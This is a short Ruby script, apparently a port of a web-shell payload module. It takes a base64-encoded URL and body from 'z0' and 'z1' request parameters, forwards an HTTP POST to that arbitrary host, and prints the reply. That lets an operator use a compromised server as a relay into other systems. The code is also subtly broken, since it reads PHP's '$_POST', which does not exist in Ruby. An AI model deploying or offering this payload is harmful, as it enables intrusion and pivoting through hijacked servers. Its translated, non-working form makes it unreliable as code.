# $_POST: global variable

require 'base64'
require 'net/http'
require 'uri'

def http_post(url_str, data)
  unless url_str.start_with?('http://', 'https://')
    url_str = "http://#{url_str}"
  end

  uri = URI.parse(url_str)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  http.read_timeout = 15

  request = Net::HTTP::Post.new(uri.request_uri)
  request['Content-Type'] = 'application/x-www-form-urlencoded'
  request.body = data

  response = http.request(request)
  [response.code.to_i, response.body]
rescue => e
  [0, "Error: #{e.message}"]
end

def main
  url  = Base64.decode64($_POST['z0'])
  data = Base64.decode64($_POST['z1'])

  return if url.empty?

  http_code, body = http_post(url, data)
  print body
  
  return
end

main